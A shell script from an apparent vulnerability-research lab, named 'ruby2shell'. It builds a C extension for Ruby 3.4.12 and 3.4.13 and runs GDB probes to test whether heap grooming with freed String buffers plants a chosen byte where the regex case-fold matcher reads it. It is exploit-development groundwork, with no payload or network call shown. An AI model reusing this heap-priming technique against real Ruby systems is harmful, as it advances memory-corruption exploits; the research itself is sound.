#!/bin/sh
# Does freeing a non-embedded Ruby String put a chosen fold byte at exact+1?
# Analysis-only, no app/wire/marker. Builds a tiny C extension for plain Ruby
# 3.4.12 (vulnerable) and 3.4.13 (fixed), primes each candidate fold with a
# String buffer filled with that fold's second byte, then records match? and
# (on 3.4.12) GDB-reads the byte at regexec.c:4278's one-byte exact.
set -eu
ROOT=$(CDPATH= cd -- "$(dirname -- "$0")/../.." && pwd)
cd "$ROOT"
OUT="$ROOT/lab/build/evidence/casefold-stringprime"
mkdir -p "$OUT"
C="$ROOT/lab/repro/ruby2shell-casefold-stringprime.c"
RB="$ROOT/lab/repro/ruby2shell-casefold-stringprime.rb"
GDB="$ROOT/lab/repro/ruby2shell-casefold-stringprime.gdb"

for pair in 3.4.12:312 3.4.13:313; do
  v=${pair%%:*}; t=${pair##*:}
  R="$ROOT/lab/build/plain/ruby-$v-plain"
  D="$ROOT/lab/build/casefold-stringprime-$t"
  mkdir -p "$D"
  gcc -shared -fPIC -O0 -g \
    -I"$ROOT/lab/build/ruby-$v" \
    -I"$R/include/ruby-3.4.0" \
    -I"$R/include/ruby-3.4.0/x86_64-linux" \
    -o "$D/ruby2shell_casefold_stringprime.so" "$C"
done

: > "$OUT/plain.txt"
for pair in 3.4.12:312 3.4.13:313; do
  v=${pair%%:*}; t=${pair##*:}
  R="$ROOT/lab/build/plain/ruby-$v-plain/bin/ruby"
  S="$ROOT/lab/build/casefold-stringprime-$t/ruby2shell_casefold_stringprime.so"
  for mode in small large; do
    for count in 1 8 64; do
      "$R" "$RB" "$S" "$mode" "$count" >> "$OUT/plain.txt"
    done
  done
done

R312="$ROOT/lab/build/plain/ruby-3.4.12-plain/bin/ruby"
S312="$ROOT/lab/build/casefold-stringprime-312/ruby2shell_casefold_stringprime.so"
# tag:mode:count:tunables
for spec in "small8:small:8:" "large8:large:8:" "large64:large:64:" \
            "large64-no-tcache:large:64:glibc.malloc.tcache_count=0"; do
  tag=${spec%%:*}; rest=${spec#*:}
  mode=${rest%%:*}; rest=${rest#*:}
  count=${rest%%:*}; tune=${rest#*:}
  log="$OUT/gdb-$tag.log"
  if [ -n "$tune" ]; then
    GLIBC_TUNABLES="$tune" gdb -q -batch -x "$GDB" --args \
      "$R312" "$RB" "$S312" "$mode" "$count" > "$log" 2>&1 || true
  else
    gdb -q -batch -x "$GDB" --args \
      "$R312" "$RB" "$S312" "$mode" "$count" > "$log" 2>&1 || true
  fi
  printf '== %s hits=%s ==\n' "$tag" "$(grep -c FOLD_HIT "$log" || true)"
  grep 'FOLD_HIT n=' "$log" | head -12 || true
done

echo '== plain outcomes (true / total) =='
grep -o 'match=[a-z]*' "$OUT/plain.txt" | sort | uniq -c
echo '== plain rows (first 12) =='
head -12 "$OUT/plain.txt"
